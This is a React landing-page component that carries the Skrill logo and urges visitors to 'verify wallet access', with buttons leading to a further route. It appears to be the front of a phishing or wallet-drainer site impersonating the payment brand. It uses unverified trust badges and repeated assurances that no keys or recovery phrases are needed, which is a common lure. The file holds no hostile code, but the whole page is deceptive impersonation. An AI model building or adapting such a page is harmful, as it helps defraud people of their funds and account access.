import React from 'react'
import { ArrowRight, CheckCircle, Globe, Lock, Send, Shield, CreditCard, Zap } from 'lucide-react'
import './skrillHome.css'
import { useNavigate } from "react-router-dom";
import skrillLogo from "../../assets/skrill_logo.png";

const SkrillLanding = () => {
  const navigate = useNavigate();

  return (
    <div className="skrill-container">
      {/* Navigation */}
      <nav className="skrill-navbar">
        <div className="skrill-nav-content">
          <div className="skrill-logo">
            <img 
              src={skrillLogo} 
              alt="Skrill Logo" 
              className="skrill-logo-img" 
            />
          </div>
        </div>
      </nav>

      {/* Hero Section */}
      <section className="skrill-hero">
        <div className="skrill-hero-content">
          <div className="skrill-hero-badge">
            <span className="skrill-badge-dot"></span>
            <span>Trusted by millions worldwide</span>
          </div>
          
          <h1 className="skrill-hero-title">
            Securely verify your wallet access
          </h1>
          
          <p className="skrill-hero-subtitle">
            Confirm wallet ownership using secure verification methods — no private keys or recovery phrases required.
          </p>
          
          <div className="skrill-hero-buttons">
            <button
              className="skrill-btn skrill-btn-primary"
              onClick={() => navigate("/skrill-landing")}
            >
              Verify wallet securely
              <ArrowRight className="skrill-btn-icon" />
            </button>
          </div>

          {/* Visual Cards */}
          <div className="skrill-payment-methods">
            <div className="skrill-payment-card skrill-card-1">
              <div className="skrill-card-icon">🔐</div>
              <div className="skrill-card-info">
                <div className="skrill-card-name">Account</div>
                <div className="skrill-card-status">Protected</div>
              </div>
            </div>
            
            <div className="skrill-payment-card skrill-card-2">
              <div className="skrill-card-icon">👛</div>
              <div className="skrill-card-info">
                <div className="skrill-card-name">Wallet</div>
                <div className="skrill-card-status">Verified</div>
              </div>
            </div>
            
            <div className="skrill-payment-card skrill-card-3">
              <div className="skrill-card-icon">✅</div>
              <div className="skrill-card-info">
                <div className="skrill-card-name">Security</div>
                <div className="skrill-card-status">Active</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Stats Section */}
      <section className="skrill-stats-section">
        <div className="skrill-stats-container">
          <div className="skrill-stat-box">
            <div className="skrill-stat-number">Fast</div>
            <div className="skrill-stat-label">Verification process</div>
          </div>
          <div className="skrill-stat-box">
            <div className="skrill-stat-number">Private</div>
            <div className="skrill-stat-label">No sensitive data stored</div>
          </div>
          <div className="skrill-stat-box">
            <div className="skrill-stat-number">Secure</div>
            <div className="skrill-stat-label">Industry best practices</div>
          </div>
        </div>
      </section>

      {/* Features Section */}
      <section className="skrill-features-section">
        <div className="skrill-section-header">
          <h2 className="skrill-section-title">Why you should secure your account</h2>
          <p className="skrill-section-description">
            Built to help you safely confirm and protect your wallet access
          </p>
        </div>

        <div className="skrill-features-grid">
          <div className="skrill-feature-box">
            <div className="skrill-feature-icon-wrapper">
              <Send className="skrill-feature-icon" />
            </div>
            <h3 className="skrill-feature-title">Secure wallet validation</h3>
            <p className="skrill-feature-text">
              Confirm wallet ownership using trusted verification methods without exposing sensitive information.
            </p>
          </div>

          <div className="skrill-feature-box">
            <div className="skrill-feature-icon-wrapper">
              <Shield className="skrill-feature-icon" />
            </div>
            <h3 className="skrill-feature-title">Privacy-first security</h3>
            <p className="skrill-feature-text">
              We never store private keys, passwords, or recovery phrases. Your privacy comes first.
            </p>
          </div>

          <div className="skrill-feature-box">
            <div className="skrill-feature-icon-wrapper">
              <CreditCard className="skrill-feature-icon" />
            </div>
            <h3 className="skrill-feature-title">Account protection controls</h3>
            <p className="skrill-feature-text">
              Add an extra layer of protection to ensure only you can access your account and connected wallets.
            </p>
          </div>

          <div className="skrill-feature-box">
            <div className="skrill-feature-icon-wrapper">
              <Zap className="skrill-feature-icon" />
            </div>
            <h3 className="skrill-feature-title">Fast verification</h3>
            <p className="skrill-feature-text">
              Complete wallet verification in seconds with a smooth and user-friendly experience.
            </p>
          </div>
        </div>
      </section>

      {/* Security Section */}
      <section className="skrill-security-section">
        <div className="skrill-security-content">
          <div className="skrill-security-visual">
            <div className="skrill-security-badge-large">
              <Lock className="skrill-badge-icon-large" />
            </div>
          </div>
          
          <div className="skrill-security-text">
            <h2 className="skrill-security-title">Your wallet security matters</h2>
            <p className="skrill-security-description">
              We apply modern security standards to help verify wallet ownership and protect user accounts — without ever requesting private keys or recovery phrases.
            </p>
            
            <div className="skrill-security-features">
              <div className="skrill-security-item">
                <CheckCircle className="skrill-check-icon" />
                <span>No private keys or recovery phrases required</span>
              </div>
              <div className="skrill-security-item">
                <CheckCircle className="skrill-check-icon" />
                <span>Secure wallet ownership verification</span>
              </div>
              <div className="skrill-security-item">
                <CheckCircle className="skrill-check-icon" />
                <span>Privacy-focused security design</span>
              </div>
              <div className="skrill-security-item">
                <CheckCircle className="skrill-check-icon" />
                <span>Trusted verification standards</span>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* CTA Section */}
      <section className="skrill-cta-section">
        <div className="skrill-cta-content">
          <h2 className="skrill-cta-title">Ready to secure your wallet?</h2>
          <p className="skrill-cta-text">
            Validate your wallet access securely and protect your account in just a few steps.
          </p>
          <button
            className="skrill-btn skrill-btn-cta"
            onClick={() => navigate("/skrill-landing")}
          >
            Start wallet verification
            <ArrowRight className="skrill-btn-icon" />
          </button>
        </div>
      </section>

      {/* Footer */}
      <footer className="skrill-footer">
        <div className="skrill-footer-content">
          <div className="skrill-footer-section skrill-footer-main">
            <div className="skrill-footer-logo">
              <img 
                src={skrillLogo} 
                alt="Skrill Logo" 
                className="skrill-logo-footer-img" 
              />
            </div>
            <p className="skrill-footer-description">
              Built with a focus on account protection and secure wallet verification, helping users maintain control and confidence online.
            </p>
          </div>

          <div className="skrill-footer-section">
            <h4 className="skrill-footer-heading">Security</h4>
            <a href="#verification" className="skrill-footer-link">Wallet verification</a>
            <a href="#privacy" className="skrill-footer-link">Privacy protection</a>
            <a href="#help" className="skrill-footer-link">Help center</a>
          </div>

          <div className="skrill-footer-section">
            <h4 className="skrill-footer-heading">Support</h4>
            <a href="#contact" className="skrill-footer-link">Contact us</a>
            <a href="#faq" className="skrill-footer-link">FAQs</a>
            <a href="#security" className="skrill-footer-link">Security tips</a>
          </div>

          <div className="skrill-footer-section">
            <h4 className="skrill-footer-heading">Legal</h4>
            <a href="#privacy" className="skrill-footer-link">Privacy policy</a>
            <a href="#terms" className="skrill-footer-link">Terms & conditions</a>
          </div>
        </div>

        <div className="skrill-footer-bottom">
          <p>© 2025. All rights reserved.</p>
        </div>
      </footer>
    </div>
  )
}

export default SkrillLanding
